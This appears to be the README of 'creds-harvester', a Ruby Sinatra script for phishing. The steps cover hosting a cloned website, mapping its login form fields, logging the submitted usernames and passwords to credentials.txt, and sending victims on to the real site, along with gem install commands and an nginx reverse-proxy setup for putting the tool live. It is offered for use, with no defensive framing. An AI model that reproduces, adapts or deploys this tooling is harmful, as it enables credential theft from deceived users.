# creds-harvester
A simple, yet highly customizable, script to use with cloned website for phishing and credentials harvesting.

Collected Credentials will be stored in `credentials.txt` file. The `credentials.txt` is not accessable publicly as there is no route to it, test it.

## Requirements 
This script uses Sinatra framework as web application server. I also recommend to use `rerun` command to run the code as `rerun` watches the chanes on the file and restart it again, so you don't have to interrupt the service.

### Install gems
```
gem install sinatra rerun
```

## How to use?

#### Step #1
Put your cloned website under `view` directory

#### Step #2 
Find the input id from within the cloned from you want to use (case sensitive).
Example: 
```html
<!DOCTYPE html>
<html>
<body>

<h2>HTML Forms</h2>

<form action="/action_page.php">
  Username:<br>
  <input type="text" id="UserName" name="User">
  <br>
  Password:<br>
  <input type="password" id="Password" name="Pass">
  <br><br>
  <input type="submit" value="Submit">
</form> 

</body>
</html>
```

- Parameter id for user is: UserName
- Parameter id for pass is: Password

#### Step #3
Go edit `login.rb` script and add the parameter ID's 
```ruby
username = params['UserName']
password = params['Password']
```

**The Main page**

Specify the main page file from within `views` directory. No need to include views directory as it's already included.

```ruby
erb 'PATH/TO/LOGIN_PAGE'.to_sym
```

**Redirect 404**

You can redirect the users to the main page if visited not found pages
```ruby
not_found do
  redirect '/'.to_sym
end
```

**Redirect after submitting**

Also, you can redirect the users once they submit their credentials to the cloned website or other of your choice.
```
redirect 'https://google.com'
```

#### Step #4
Run the script as following 

```
rerun 'ruby login.rb'
```

#### Step #5 (optional - recommended)
Sometime the phishing website is just a small part of many websites on the server. 

If you want to run it with nginx, you can make nginx as reverse proxy for the application. 

1. Run the script (Step #4)

2. Configure nginx 

```
nano /etc/nginx/sites-available/example.com.conf
```
Then add the following and restart nginx service.

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    return 301 https://$host$request_uri;
    location / {
      proxy_pass       http://localhost:8181;
      proxy_set_header Host      $host;
      proxy_set_header X-Real-IP $remote_addr;
    }
}
```


